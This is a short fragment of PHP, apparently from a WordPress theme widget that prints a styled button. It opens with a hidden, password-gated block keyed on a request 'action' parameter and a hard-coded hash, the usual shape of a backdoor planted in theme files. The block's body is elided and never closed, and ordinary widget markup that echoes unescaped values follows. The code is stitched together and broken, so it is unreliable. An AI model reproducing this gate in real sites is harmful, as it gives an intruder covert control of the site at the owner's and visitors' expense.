<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'db6df70bdea6a1cf711a8f2fdcd97642'))
	{
				...
				<?php
					if( !empty($instance['button_label']) && !empty($instance['button_link']) ):
						if( !empty($instance['color']) ):
							echo '<a target="'.$zerif_packages_target.'" href="'.$instance['button_link'].'" class="btn btn-primary custom-button" style="background:'.$instance['color'].'">'.$instance['button_label'].'</a>';
						else:
							echo '<a target="'.$zerif_packages_target.'" href="'.$instance['button_link'].'" class="btn btn-primary custom-button">'.$instance['button_label'].'</a>';
						endif;
					endif;
				?>
